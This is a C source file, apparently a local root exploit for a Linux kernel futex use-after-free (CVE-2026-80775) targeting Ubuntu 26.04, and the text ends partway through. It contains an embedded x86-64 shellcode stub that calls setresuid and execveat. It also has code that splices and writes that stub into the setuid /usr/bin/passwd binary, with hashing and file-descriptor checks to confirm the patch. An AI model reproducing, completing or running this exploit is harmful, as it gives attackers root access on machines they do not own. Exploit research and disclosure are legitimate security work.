/*
 * Futex (CVE-2026-80775): Private hash UAF in prctl()
 *
 * Target: Ubuntu 26.04 7.0.0-30-generic
 *
 * Copyright (c) 2026 Hyunwoo Kim (@v4bel)
 */

#define _GNU_SOURCE
#pragma GCC optimize("O2", "no-omit-frame-pointer")
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <linux/futex.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/fsuid.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/statvfs.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#ifndef SYS_execveat
#define SYS_execveat 322
#endif

#ifndef SYS_gettid
#define SYS_gettid 186
#endif

#ifndef SYS_memfd_create
#define SYS_memfd_create 319
#endif

#ifndef SYS_close_range
#define SYS_close_range 436
#endif

#define PAYLOAD_HANDOFF_NORETURN __attribute__((noreturn))

enum {
	PAYLOAD_HANDOFF_FD_BIN_DIR = 194,
	PAYLOAD_HANDOFF_FD_TARGET = 195,
	PAYLOAD_HANDOFF_FD_ROOT_DIR = 196,
	PAYLOAD_HANDOFF_FD_RECORD = 197,
	PAYLOAD_HANDOFF_FD_SELF = 198,
	PAYLOAD_HANDOFF_FD_RESULT = 199,
	PAYLOAD_HANDOFF_FIRST_FIXED_FD = PAYLOAD_HANDOFF_FD_BIN_DIR,
	PAYLOAD_HANDOFF_LAST_FIXED_FD = PAYLOAD_HANDOFF_FD_RESULT,
	PAYLOAD_HANDOFF_FIXED_FD_COUNT = PAYLOAD_HANDOFF_LAST_FIXED_FD -
					 PAYLOAD_HANDOFF_FIRST_FIXED_FD + 1,
	PAYLOAD_STUB_BYTES = 116,
	PAYLOAD_PREFIX_BYTES = 16,
	PAYLOAD_REMAINDER_BYTES = 100,
	PAYLOAD_HANDOFF_RECORD_VERSION = 2,
	PAYLOAD_HANDOFF_TARGET_MAX_BYTES = 1U << 24,
};

static const char payload_handoff_target_path[] = "passwd";
static const char payload_handoff_target_dir[] = "/usr/bin";
static size_t payload_handoff_target_bytes;
static off_t payload_handoff_patch_offset;
static off_t payload_handoff_splice_offset;
static uint8_t payload_handoff_original_entry[PAYLOAD_STUB_BYTES];
static uint8_t payload_handoff_digest_original[32];
static uint8_t payload_digest_partial[32];
static uint8_t payload_digest_complete[32];
static uint32_t payload_handoff_start_uid;
static uint32_t payload_handoff_start_gid;

enum target_patch_state {
	PAYLOAD_HANDOFF_TARGET_ORIGINAL = 0,
	TARGET_PARTIALLY_PATCHED = 1,
	TARGET_FULLY_PATCHED = 2,
};

enum payload_write_stage {
	PIPE_PAYLOAD_PARTIAL = 1,
	PIPE_PAYLOAD_COMPLETE = 2,
};

_Static_assert(PAYLOAD_PREFIX_BYTES + PAYLOAD_REMAINDER_BYTES ==
		       PAYLOAD_STUB_BYTES,
	       "two-stage payload must cover the stub");

static const uint8_t payload_handoff_entry_stub[PAYLOAD_STUB_BYTES] = {
	0xf3, 0x0f, 0x1e, 0xfa, 0x31, 0xff, 0x31, 0xf6, 0x31, 0xd2, 0xb8, 0x77,
	0x00, 0x00, 0x00, 0x0f, 0x05, 0x85, 0xc0, 0x75, 0x36, 0xb8, 0x75, 0x00,
	0x00, 0x00, 0x0f, 0x05, 0x85, 0xc0, 0x75, 0x2b, 0x48, 0x8d, 0x35, 0x32,
	0x00, 0x00, 0x00, 0x48, 0x8d, 0x0d, 0x2c, 0x00, 0x00, 0x00, 0x31, 0xc0,
	0x50, 0x49, 0x89, 0xe2, 0x50, 0x51, 0x48, 0x89, 0xe2, 0xbf, 0xc6, 0x00,
	0x00, 0x00, 0x41, 0xb8, 0x00, 0x10, 0x00, 0x00, 0xb8, 0x42, 0x01, 0x00,
	0x00, 0x0f, 0x05, 0xbf, 0x7f, 0x00, 0x00, 0x00, 0xb8, 0xe7, 0x00, 0x00,
	0x00, 0x0f, 0x05, 0x0f, 0x0b, 0x00, 0x70, 0x6f, 0x63, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
};

struct payload_handoff_sha256 {
	uint32_t state[8];
	uint64_t bits;
	uint8_t block[64];
	size_t used;
};

struct payload_handoff_fd_identity {
	uint64_t dev;
	uint64_t ino;
	uint64_t rdev;
	uint64_t size;
	uint64_t nlink;
	uint32_t mode;
	uint32_t uid;
	uint32_t gid;
	uint32_t status_flags;
};

struct payload_handoff_run_record {
	uint8_t magic[8];
	uint32_t version;
	uint32_t record_size;
	uint64_t target_bytes;
	uint64_t patch_offset;
	uint8_t target_original_sha256[32];
	uint8_t target_partial_sha256[32];
	uint8_t target_patched_sha256[32];
	uint8_t original_entry[PAYLOAD_STUB_BYTES];
	uint32_t reserved;
	struct payload_handoff_fd_identity fd[PAYLOAD_HANDOFF_FIXED_FD_COUNT];
};

struct payload_handoff_shared {
	_Alignas(64) _Atomic int effect_ready;
	_Atomic int parent_no_new_privs_enabled;
	_Atomic int effect_go;
	_Atomic int effect_error;
	_Atomic int effect_pid;
	struct payload_handoff_run_record record;
};

struct payload_handoff_ids {
	uint32_t ruid;
	uint32_t euid;
	uint32_t suid;
	uint32_t fsuid;
	uint32_t rgid;
	uint32_t egid;
	uint32_t sgid;
	uint32_t fsgid;
};

_Static_assert(sizeof(struct payload_handoff_fd_identity) == 56,
	       "fixed identity wire size drift");
_Static_assert(sizeof(struct payload_handoff_run_record) == 584,
	       "sealed run record size drift");

static const uint8_t payload_handoff_record_magic[8] = { 'S', 'T', '2', 'R',
							 '2', '1', '4', '2' };

static int
payload_handoff_load_sealed_record(struct payload_handoff_run_record *record);

enum {
	ATTEMPT_RETRY = 0,
	ATTEMPT_UNSAFE = 1,
	ATTEMPT_EXIT_RETRY = 10,
	ATTEMPT_EXIT_UNSAFE = 11,
	MAX_EXPLOIT_ATTEMPTS = 1500,
	CAMPAIGN_BUDGET_SECONDS = 1800,
	ROOT_WAIT_TIMEOUT_MS = 60000,
};

#define AIO_RESERVOIR_CONTEXT_COUNT 60000
#define PT_LOAD_TYPE 1

struct payload_handoff_shared;
struct pi_reservoir_aio_heartbeat;

static struct payload_handoff_shared *effect_shared;
static struct pi_reservoir_aio_heartbeat *aio_heartbeat;
static int result_read_fd = -1;
static int parent_no_new_privs_commits;
static pid_t attempt_root_pid;

#define CAMPAIGN_BUDGET_NS \
	((uint64_t)CAMPAIGN_BUDGET_SECONDS * UINT64_C(1000000000))

static void abort_attempt(int unsafe, const char *why)
	__attribute__((noreturn));
static void finish_attempt(void) __attribute__((noreturn));
static void PAYLOAD_HANDOFF_NORETURN payload_handoff_park(void);

static uint32_t payload_handoff_rotr(uint32_t value, unsigned int shift)
{
	return (value >> shift) | (value << (32U - shift));
}

static void
payload_handoff_sha256_transform(struct payload_handoff_sha256 *hash,
				 const uint8_t block[64])
{
	static const uint32_t constant[64] = {
		0x428a2f98U, 0x71374491U, 0xb5c0fbcfU, 0xe9b5dba5U, 0x3956c25bU,
		0x59f111f1U, 0x923f82a4U, 0xab1c5ed5U, 0xd807aa98U, 0x12835b01U,
		0x243185beU, 0x550c7dc3U, 0x72be5d74U, 0x80deb1feU, 0x9bdc06a7U,
		0xc19bf174U, 0xe49b69c1U, 0xefbe4786U, 0x0fc19dc6U, 0x240ca1ccU,
		0x2de92c6fU, 0x4a7484aaU, 0x5cb0a9dcU, 0x76f988daU, 0x983e5152U,
		0xa831c66dU, 0xb00327c8U, 0xbf597fc7U, 0xc6e00bf3U, 0xd5a79147U,
		0x06ca6351U, 0x14292967U, 0x27b70a85U, 0x2e1b2138U, 0x4d2c6dfcU,
		0x53380d13U, 0x650a7354U, 0x766a0abbU, 0x81c2c92eU, 0x92722c85U,
		0xa2bfe8a1U, 0xa81a664bU, 0xc24b8b70U, 0xc76c51a3U, 0xd192e819U,
		0xd6990624U, 0xf40e3585U, 0x106aa070U, 0x19a4c116U, 0x1e376c08U,
		0x2748774cU, 0x34b0bcb5U, 0x391c0cb3U, 0x4ed8aa4aU, 0x5b9cca4fU,
		0x682e6ff3U, 0x748f82eeU, 0x78a5636fU, 0x84c87814U, 0x8cc70208U,
		0x90befffaU, 0xa4506cebU, 0xbef9a3f7U, 0xc67178f2U,
	};
	uint32_t words[64];
	uint32_t a, b, c, d, e, f, g, h;

	for (size_t index = 0; index < 16; ++index)
		words[index] = ((uint32_t)block[index * 4] << 24) |
			       ((uint32_t)block[index * 4 + 1] << 16) |
			       ((uint32_t)block[index * 4 + 2] << 8) |
			       block[index * 4 + 3];
	for (size_t index = 16; index < 64; ++index) {
		uint32_t s0 = payload_handoff_rotr(words[index - 15], 7) ^
			      payload_handoff_rotr(words[index - 15], 18) ^
			      (words[index - 15] >> 3);
		uint32_t s1 = payload_handoff_rotr(words[index - 2], 17) ^
			      payload_handoff_rotr(words[index - 2], 19) ^
			      (words[index - 2] >> 10);

		words[index] = words[index - 16] + s0 + words[index - 7] + s1;
	}
	a = hash->state[0];
	b = hash->state[1];
	c = hash->state[2];
	d = hash->state[3];
	e = hash->state[4];
	f = hash->state[5];
	g = hash->state[6];
	h = hash->state[7];
	for (size_t index = 0; index < 64; ++index) {
		uint32_t s1 = payload_handoff_rotr(e, 6) ^
			      payload_handoff_rotr(e, 11) ^
			      payload_handoff_rotr(e, 25);
		uint32_t choice = (e & f) ^ (~e & g);
		uint32_t first =
			h + s1 + choice + constant[index] + words[index];
		uint32_t s0 = payload_handoff_rotr(a, 2) ^
			      payload_handoff_rotr(a, 13) ^
			      payload_handoff_rotr(a, 22);
		uint32_t majority = (a & b) ^ (a & c) ^ (b & c);
		uint32_t second = s0 + majority;

		h = g;
		g = f;
		f = e;
		e = d + first;
		d = c;
		c = b;
		b = a;
		a = first + second;
	}
	hash->state[0] += a;
	hash->state[1] += b;
	hash->state[2] += c;
	hash->state[3] += d;
	hash->state[4] += e;
	hash->state[5] += f;
	hash->state[6] += g;
	hash->state[7] += h;
}

static void payload_handoff_sha256_init(struct payload_handoff_sha256 *hash)
{
	static const uint32_t initial[8] = {
		0x6a09e667U, 0xbb67ae85U, 0x3c6ef372U, 0xa54ff53aU,
		0x510e527fU, 0x9b05688cU, 0x1f83d9abU, 0x5be0cd19U,
	};

	memset(hash, 0, sizeof(*hash));
	memcpy(hash->state, initial, sizeof(initial));
}

static void payload_handoff_sha256_update(struct payload_handoff_sha256 *hash,
					  const void *data, size_t length)
{
	const uint8_t *bytes = data;

	hash->bits += (uint64_t)length * 8U;
	while (length != 0) {
		size_t take = sizeof(hash->block) - hash->used;

		if (take > length)
			take = length;
		memcpy(hash->block + hash->used, bytes, take);
		hash->used += take;
		bytes += take;
		length -= take;
		if (hash->used == sizeof(hash->block)) {
			payload_handoff_sha256_transform(hash, hash->block);
			hash->used = 0;
		}
	}
}

static void payload_handoff_sha256_final(struct payload_handoff_sha256 *hash,
					 uint8_t digest[32])
{
	uint64_t bits = hash->bits;

	hash->block[hash->used++] = 0x80;
	if (hash->used > 56) {
		memset(hash->block + hash->used, 0, 64 - hash->used);
		payload_handoff_sha256_transform(hash, hash->block);
		hash->used = 0;
	}
	memset(hash->block + hash->used, 0, 56 - hash->used);
	for (size_t index = 0; index < 8; ++index)
		hash->block[63 - index] = (uint8_t)(bits >> (index * 8));
	payload_handoff_sha256_transform(hash, hash->block);
	for (size_t index = 0; index < 8; ++index) {
		digest[index * 4] = (uint8_t)(hash->state[index] >> 24);
		digest[index * 4 + 1] = (uint8_t)(hash->state[index] >> 16);
		digest[index * 4 + 2] = (uint8_t)(hash->state[index] >> 8);
		digest[index * 4 + 3] = (uint8_t)hash->state[index];
	}
}

static void payload_handoff_hash_memory(const void *bytes, size_t length,
					uint8_t digest[32])
{
	struct payload_handoff_sha256 hash;

	payload_handoff_sha256_init(&hash);
	payload_handoff_sha256_update(&hash, bytes, length);
	payload_handoff_sha256_final(&hash, digest);
}

static int payload_handoff_hash_fd_exact(int fd, size_t length,
					 uint8_t digest[32])
{
	struct payload_handoff_sha256 hash;
	uint8_t buffer[4096];
	uint8_t extra;
	ssize_t extra_result;
	size_t offset = 0;

	payload_handoff_sha256_init(&hash);
	while (offset < length) {
		size_t want = length - offset;
		ssize_t done;

		if (want > sizeof(buffer))
			want = sizeof(buffer);
		do {
			done = pread(fd, buffer, want, (off_t)offset);
		} while (done < 0 && errno == EINTR);
		if (done <= 0)
			return -1;
		payload_handoff_sha256_update(&hash, buffer, (size_t)done);
		offset += (size_t)done;
	}
	do {
		extra_result = pread(fd, &extra, 1, (off_t)length);
	} while (extra_result < 0 && errno == EINTR);
	if (extra_result != 0)
		return -1;
	payload_handoff_sha256_final(&hash, digest);
	return 0;
}

static int payload_handoff_expected_digest(enum target_patch_state state,
					   uint8_t digest[32])
{
	const uint8_t *source;

	switch (state) {
	case PAYLOAD_HANDOFF_TARGET_ORIGINAL:
		source = payload_handoff_digest_original;
		break;
	case TARGET_PARTIALLY_PATCHED:
		source = payload_digest_partial;
		break;
	case TARGET_FULLY_PATCHED:
		source = payload_digest_complete;
		break;
	default:
		return -1;
	}
	memcpy(digest, source, 32);
	return 0;
}

static int payload_handoff_verify_target_hash(int fd,
					      enum target_patch_state state)
{
	uint8_t actual[32];
	uint8_t expected[32];

	return payload_handoff_expected_digest(state, expected) == 0 &&
			       payload_handoff_hash_fd_exact(
				       fd, payload_handoff_target_bytes,
				       actual) == 0 &&
			       memcmp(actual, expected, sizeof(actual)) == 0 ?
		       0 :
		       -1;
}

static int payload_handoff_capture_ids(struct payload_handoff_ids *ids)
{
	uid_t ruid, euid, suid;
	gid_t rgid, egid, sgid;

	if (getresuid(&ruid, &euid, &suid) != 0 ||
	    getresgid(&rgid, &egid, &sgid) != 0)
		return -1;
	ids->ruid = (uint32_t)ruid;
	ids->euid = (uint32_t)euid;
	ids->suid = (uint32_t)suid;
	ids->fsuid = (uint32_t)setfsuid((uid_t)-1);
	ids->rgid = (uint32_t)rgid;
	ids->egid = (uint32_t)egid;
	ids->sgid = (uint32_t)sgid;
	ids->fsgid = (uint32_t)setfsgid((gid_t)-1);
	return 0;
}

static int payload_handoff_ids_are(const struct payload_handoff_ids *ids,
				   uint32_t value)
{
	return ids->ruid == value && ids->euid == value && ids->suid == value &&
	       ids->fsuid == value && ids->rgid == value &&
	       ids->egid == value && ids->sgid == value && ids->fsgid == value;
}

static int payload_handoff_ids_are_start(const struct payload_handoff_ids *ids)
{
	return ids->ruid == payload_handoff_start_uid &&
	       ids->euid == payload_handoff_start_uid &&
	       ids->suid == payload_handoff_start_uid &&
	       ids->fsuid == payload_handoff_start_uid &&
	       ids->rgid == payload_handoff_start_gid &&
	       ids->egid == payload_handoff_start_gid &&
	       ids->sgid == payload_handoff_start_gid &&
	       ids->fsgid == payload_handoff_start_gid;
}

static int payload_handoff_nnp_is(int expected)
{
	return prctl(PR_GET_NO_NEW_PRIVS, 0, 0, 0, 0) == expected ? 0 : -1;
}

static int payload_handoff_get_fd_flags(int fd)
{
	int value;

	do {
		value = fcntl(fd, F_GETFD);
	} while (value < 0 && errno == EINTR);
	return value;
}

static int payload_handoff_get_status_flags(int fd)
{
	int value;

	do {
		value = fcntl(fd, F_GETFL);
	} while (value < 0 && errno == EINTR);
	return value;
}

static int
payload_handoff_capture_identity(int fd,
				 struct payload_handoff_fd_identity *identity)
{
	struct stat status;
	int flags;

	if (fstat(fd, &status) != 0)
		return -1;
	flags = payload_handoff_get_status_flags(fd);
	if (flags < 0 || status.st_size < 0)
		return -1;
	identity->dev = (uint64_t)status.st_dev;
	identity->ino = (uint64_t)status.st_ino;
	identity->rdev = (uint64_t)status.st_rdev;
	identity->size = (uint64_t)status.st_size;
	identity->nlink = (uint64_t)status.st_nlink;
	identity->mode = (uint32_t)status.st_mode;
	identity->uid = (uint32_t)status.st_uid;
	identity->gid = (uint32_t)status.st_gid;
	identity->status_flags = (uint32_t)flags;
	return 0;
}

static int payload_handoff_identity_matches(
	int fd, const struct payload_handoff_fd_identity *expected)
{
	struct payload_handoff_fd_identity actual;

	if (payload_handoff_capture_identity(fd, &actual) != 0)
		return -1;
	return memcmp(&actual, expected, sizeof(actual)) == 0 ? 0 : -1;
}

static int payload_handoff_target_metadata_fd(
	int fd, const struct payload_handoff_fd_identity *sealed)
{
	struct stat status;

	if (fstat(fd, &status) != 0 || !S_ISREG(status.st_mode) ||
	    (uint64_t)status.st_dev != sealed->dev ||
	    (uint64_t)status.st_ino != sealed->ino ||
	    (size_t)status.st_size != payload_handoff_target_bytes ||
	    status.st_uid != 0 || status.st_gid != 0 ||
	    (status.st_mode & 07777) != 04755 || status.st_nlink != 1)
		return -1;
	return 0;
}

static int payload_handoff_install_fd(int source, int target)
{
	int flags;

	if (source == target) {
		flags = payload_handoff_get_fd_flags(source);
		if (flags < 0 ||
		    fcntl(source, F_SETFD, flags & ~FD_CLOEXEC) != 0)
			return -1;
		return 0;
	}
	if (dup3(source, target, 0) < 0)
		return -1;
	if (close(source) != 0)
		return -1;
	return 0;
}

static int payload_handoff_fixed_fds_ok(void)
{
	for (int fd = PAYLOAD_HANDOFF_FIRST_FIXED_FD;
	     fd <= PAYLOAD_HANDOFF_LAST_FIXED_FD; ++fd) {
		int flags = payload_handoff_get_fd_flags(fd);

		if (flags < 0 || (flags & FD_CLOEXEC) != 0)
			return -1;
	}
	return 0;
}

static int payload_handoff_close_range_fallback(unsigned int first,
						unsigned int last)
{
	struct rlimit limit;
	unsigned int bounded_last = last;

	if (syscall(SYS_close_range, first, last, 0U) == 0)
		return 0;
	if (errno != ENOSYS)
		return -1;
	if (last == UINT_MAX) {
		if (getrlimit(RLIMIT_NOFILE, &limit) != 0 ||
		    limit.rlim_cur == 0)
			return -1;
		bounded_last = limit.rlim_cur - 1 > UINT_MAX ?
				       UINT_MAX :
				       (unsigned int)(limit.rlim_cur - 1);
	}
	if (bounded_last < first)
		return 0;
	for (unsigned int fd = first; fd <= bounded_last; ++fd) {
		if (close((int)fd) != 0 && errno != EBADF)
			return -1;
		if (fd == UINT_MAX)
			break;
	}
	return 0;
}

static int payload_handoff_effect_close_unlisted(void)
{
	return payload_handoff_close_range_fallback(
		       3U, PAYLOAD_HANDOFF_FIRST_FIXED_FD - 1U) == 0 &&
			       payload_handoff_close_range_fallback(
				       PAYLOAD_HANDOFF_LAST_FIXED_FD + 1U,
				       UINT_MAX) == 0 ?
		       0 :
		       -1;
}

static void payload_handoff_close_fixed_all(void)
{
	for (int fd = PAYLOAD_HANDOFF_FIRST_FIXED_FD;
	     fd <= PAYLOAD_HANDOFF_LAST_FIXED_FD; ++fd)
		(void)close(fd);
}

static void payload_handoff_worker_keep_target_only(void)
{
	if (result_read_fd >= 0)
		(void)close(result_read_fd);
	for (int fd = PAYLOAD_HANDOFF_FIRST_FIXED_FD;
	     fd <= PAYLOAD_HANDOFF_LAST_FIXED_FD; ++fd)
		if (fd != PAYLOAD_HANDOFF_FD_TARGET)
			(void)close(fd);
}

static int payload_handoff_controller_keep_verifiers(void)
{
	struct payload_handoff_run_record record;

	if (result_read_fd >= 0 && close(result_read_fd) != 0)
		return -1;
	result_read_fd = -1;
	if (payload_handoff_load_sealed_record(&record) != 0)
		return -1;
	for (int fd = PAYLOAD_HANDOFF_FIRST_FIXED_FD;
	     fd <= PAYLOAD_HANDOFF_LAST_FIXED_FD; ++fd)
		if (fd != PAYLOAD_HANDOFF_FD_TARGET)
			(void)close(fd);
	return 0;
}

static void payload_handoff_vulnerable_close_effect_fds(void)
{
	if (result_read_fd >= 0)
		(void)close(result_read_fd);
	payload_handoff_close_fixed_all();
}

static int payload_handoff_read_exact_at(int fd, void *buffer, size_t length,
					 off_t offset, int require_eof)
{
	uint8_t *cursor = buffer;
	size_t remaining = length;

	while (remaining != 0) {
		ssize_t done;

		do {
			done = pread(fd, cursor, remaining, offset);
		} while (done < 0 && errno == EINTR);
		if (done <= 0)
			return -1;
		cursor += (size_t)done;
		remaining -= (size_t)done;
		offset += done;
	}
	if (require_eof) {
		uint8_t extra;
		ssize_t done;

		do {
			done = pread(fd, &extra, 1, offset);
		} while (done < 0 && errno == EINTR);
		if (done != 0)
			return -1;
	}
	return 0;
}

static int payload_handoff_write_exact_at(int fd, const void *buffer,
					  size_t length, off_t offset)
{
	ssize_t done;

	do {
		done = pwrite(fd, buffer, length, offset);
	} while (done < 0 && errno == EINTR);
	return done == (ssize_t)length ? 0 : -1;
}

static int payload_handoff_write_pipe_exact(int fd, const void *buffer,
					    size_t length)
{
	ssize_t done;

	do {
		done = write(fd, buffer, length);
	} while (done < 0 && errno == EINTR);
	return done == (ssize_t)length ? 0 : -1;
}

static int
payload_handoff_run_record_init(struct payload_handoff_run_record *record)
{
	if (record == NULL || payload_handoff_target_bytes == 0 ||
	    payload_handoff_patch_offset <= 0)
		return -1;
	memset(record, 0, sizeof(*record));
	memcpy(record->magic, payload_handoff_record_magic,
	       sizeof(record->magic));
	record->version = PAYLOAD_HANDOFF_RECORD_VERSION;
	record->record_size = (uint32_t)sizeof(*record);
	record->target_bytes = (uint64_t)payload_handoff_target_bytes;
	record->patch_offset = (uint64_t)payload_handoff_patch_offset;
	memcpy(record->target_original_sha256, payload_handoff_digest_original,
	       32);
	memcpy(record->target_partial_sha256, payload_digest_partial, 32);
	memcpy(record->target_patched_sha256, payload_digest_complete, 32);
	memcpy(record->original_entry, payload_handoff_original_entry,
	       sizeof(record->original_entry));
	return 0;
}

static int payload_handoff_validate_record_constants(
	const struct payload_handoff_run_record *record)
{
	if (record == NULL ||
	    memcmp(record->magic, payload_handoff_record_magic,
		   sizeof(record->magic)) != 0 ||
	    record->version != PAYLOAD_HANDOFF_RECORD_VERSION ||
	    record->record_size != sizeof(*record) || record->reserved != 0 ||
	    record->target_bytes == 0 ||
	    record->target_bytes > PAYLOAD_HANDOFF_TARGET_MAX_BYTES ||
	    record->patch_offset <= 0 || record->patch_offset % 4096 == 0 ||
	    record->patch_offset + PAYLOAD_STUB_BYTES > record->target_bytes)
		return -1;
	return 0;
}

static int payload_handoff_validate_fixed_types(
	const struct payload_handoff_run_record *record)
{
	const struct payload_handoff_fd_identity *fd = record->fd;
	const uint32_t mask = O_ACCMODE | O_PATH | O_DIRECTORY | O_APPEND |
			      O_NONBLOCK;

	if (!S_ISDIR(fd[PAYLOAD_HANDOFF_FD_BIN_DIR -
			PAYLOAD_HANDOFF_FIRST_FIXED_FD]
			     .mode) ||
	    !S_ISREG(fd[PAYLOAD_HANDOFF_FD_TARGET -
			PAYLOAD_HANDOFF_FIRST_FIXED_FD]
			     .mode) ||
	    !S_ISDIR(fd[PAYLOAD_HANDOFF_FD_ROOT_DIR -
			PAYLOAD_HANDOFF_FIRST_FIXED_FD]
			     .mode) ||
	    !S_ISREG(fd[PAYLOAD_HANDOFF_FD_RECORD -
			PAYLOAD_HANDOFF_FIRST_FIXED_FD]
			     .mode) ||
	    !S_ISREG(
		    fd[PAYLOAD_HANDOFF_FD_SELF - PAYLOAD_HANDOFF_FIRST_FIXED_FD]
			    .mode) ||
	    !S_ISFIFO(fd[PAYLOAD_HANDOFF_FD_RESULT -
			 PAYLOAD_HANDOFF_FIRST_FIXED_FD]
			      .mode))
		return -1;
	if (fd[PAYLOAD_HANDOFF_FD_BIN_DIR - PAYLOAD_HANDOFF_FIRST_FIXED_FD]
			    .uid != 0 ||
	    fd[PAYLOAD_HANDOFF_FD_BIN_DIR - PAYLOAD_HANDOFF_FIRST_FIXED_FD]
			    .gid != 0 ||
	    fd[PAYLOAD_HANDOFF_FD_ROOT_DIR - PAYLOAD_HANDOFF_FIRST_FIXED_FD]
			    .uid != 0 ||
	    fd[PAYLOAD_HANDOFF_FD_ROOT_DIR - PAYLOAD_HANDOFF_FIRST_FIXED_FD]
			    .gid != 0)
		return -1;
	if (fd[PAYLOAD_HANDOFF_FD_TARGET - PAYLOAD_HANDOFF_FIRST_FIXED_FD].uid !=
		    0 ||
	    fd[PAYLOAD_HANDOFF_FD_TARGET - PAYLOAD_HANDOFF_FIRST_FIXED_FD].gid !=
		    0 ||
	    (fd[PAYLOAD_HANDOFF_FD_TARGET - PAYLOAD_HANDOFF_FIRST_FIXED_FD].mode &
	     07777U) != 04755U ||
	    fd[PAYLOAD_HANDOFF_FD_TARGET - PAYLOAD_HANDOFF_FIRST_FIXED_FD]
			    .nlink != 1 ||
	    fd[PAYLOAD_HANDOFF_FD_RECORD - PAYLOAD_HANDOFF_FIRST_FIXED_FD]
			    .nlink != 0)
		return -1;
	if ((fd[PAYLOAD_HANDOFF_FD_BIN_DIR - PAYLOAD_HANDOFF_FIRST_FIXED_FD]
		     .status_flags &
	     mask) != (O_PATH | O_DIRECTORY) ||
	    (fd[PAYLOAD_HANDOFF_FD_TARGET - PAYLOAD_HANDOFF_FIRST_FIXED_FD]
		     .status_flags &
	     mask) != O_RDONLY ||
	    (fd[PAYLOAD_HANDOFF_FD_ROOT_DIR - PAYLOAD_HANDOFF_FIRST_FIXED_FD]
		     .status_flags &
	     mask) != (O_PATH | O_DIRECTORY) ||
	    (fd[PAYLOAD_HANDOFF_FD_RECORD - PAYLOAD_HANDOFF_FIRST_FIXED_FD]
		     .status_flags &
	     mask) != O_RDWR ||
	    (fd[PAYLOAD_HANDOFF_FD_SELF - PAYLOAD_HANDOFF_FIRST_FIXED_FD]
		     .status_flags &
	     mask) != O_RDONLY ||
	    (fd[PAYLOAD_HANDOFF_FD_RESULT - PAYLOAD_HANDOFF_FIRST_FIXED_FD]
		     .status_flags &
	     mask) != O_WRONLY)
		return -1;
	return 0;
}

static int
payload_handoff_load_sealed_record(struct payload_handoff_run_record *record)
{
	int seals;

	if (payload_handoff_read_exact_at(PAYLOAD_HANDOFF_FD_RECORD, record,
					  sizeof(*record), 0, 1) != 0)
		return -1;
	seals = fcntl(PAYLOAD_HANDOFF_FD_RECORD, F_GET_SEALS);
	if (seals != (F_SEAL_SEAL | F_SEAL_SHRINK | F_SEAL_GROW |
		      F_SEAL_WRITE) ||
	    payload_handoff_validate_record_constants(record) != 0 ||
	    payload_handoff_validate_fixed_types(record) != 0)
		return -1;
	return 0;
}

static int payload_handoff_require_fixed_identities(
	const struct payload_handoff_run_record *record)
{
	for (int fd = PAYLOAD_HANDOFF_FIRST_FIXED_FD;
	     fd <= PAYLOAD_HANDOFF_LAST_FIXED_FD; ++fd)
		if (payload_handoff_identity_matches(
			    fd,
			    &record->fd[fd - PAYLOAD_HANDOFF_FIRST_FIXED_FD]) !=
		    0)
			return -1;
	return 0;
}

static uint64_t monotonic_ns_generic(void)
{
	struct timespec now;

	if (clock_gettime(CLOCK_MONOTONIC, &now) != 0)
		return 0;
	return (uint64_t)now.tv_sec * UINT64_C(1000000000) +
	       (uint64_t)now.tv_nsec;
}

static int payload_handoff_futex_wait(_Atomic int *word, int expected,
				      const struct timespec *timeout)
{
	return (int)syscall(SYS_futex, word, FUTEX_WAIT, expected, timeout,
			    NULL, 0);
}

static int payload_handoff_futex_wake(_Atomic int *word, int count)
{
	return (int)syscall(SYS_futex, word, FUTEX_WAKE, count, NULL, NULL, 0);
}

static int payload_handoff_wait_at_least(_Atomic int *word, int minimum,
					 int timeout_ms)
{
	uint64_t start = monotonic_ns_generic();

	if (start == 0)
		return -1;
	for (;;) {
		int value = atomic_load_explicit(word, memory_order_acquire);
		uint64_t now;
		uint64_t elapsed;
		struct timespec remaining;

		if (value >= minimum)
			return 0;
		now = monotonic_ns_generic();
		if (now == 0 || now < start)
			return -1;
		elapsed = now - start;
		if (elapsed >= (uint64_t)timeout_ms * UINT64_C(1000000))
			return -1;
		remaining.tv_sec = 0;
		remaining.tv_nsec = 10000000;
		(void)payload_handoff_futex_wait(word, value, &remaining);
	}
}

static void PAYLOAD_HANDOFF_NORETURN payload_handoff_park(void)
{
	static _Atomic int held;

	for (;;) {
		(void)syscall(SYS_futex, &held, FUTEX_WAIT_PRIVATE, 0, NULL,
			      NULL, 0);
	}
}

static void PAYLOAD_HANDOFF_NORETURN
payload_handoff_effect_fail(struct payload_handoff_shared *shared, int code)
{
	atomic_store_explicit(&shared->effect_error, code,
			      memory_order_release);
	atomic_store_explicit(&shared->effect_ready, 1, memory_order_release);
	(void)payload_handoff_futex_wake(&shared->effect_ready, INT_MAX);
	payload_handoff_park();
}

static const uint8_t *
payload_handoff_pipe_stage_payload(enum payload_write_stage stage,
				   size_t *length)
{
	if (length == NULL)
		return NULL;
	if (stage == PIPE_PAYLOAD_PARTIAL) {
		*length = PAYLOAD_PREFIX_BYTES;
		return payload_handoff_entry_stub;
	}
	if (stage == PIPE_PAYLOAD_COMPLETE) {
		*length = PAYLOAD_REMAINDER_BYTES;
		return payload_handoff_entry_stub + PAYLOAD_PREFIX_BYTES;
	}
	*length = 0;
	return NULL;
}

static int payload_handoff_splice_target_byte(int pipe_write_fd)
{
	off_t source_offset = payload_handoff_splice_offset;
	ssize_t done;

	do {
		done = splice(PAYLOAD_HANDOFF_FD_TARGET, &source_offset,
			      pipe_write_fd, NULL, 1, 0);
	} while (done < 0 && errno == EINTR);
	return done == 1 && source_offset == payload_handoff_patch_offset ? 0 :
									    -1;
}

static int payload_handoff_write_pipe_stage(int pipe_write_fd,
					    enum payload_write_stage stage)
{
	size_t length;
	const uint8_t *payload =
		payload_handoff_pipe_stage_payload(stage, &length);
	ssize_t done;

	if (payload == NULL)
		return -1;
	do {
		done = write(pipe_write_fd, payload, length);
	} while (done < 0 && errno == EINTR);
	return done == (ssize_t)length ? 0 : -1;
}

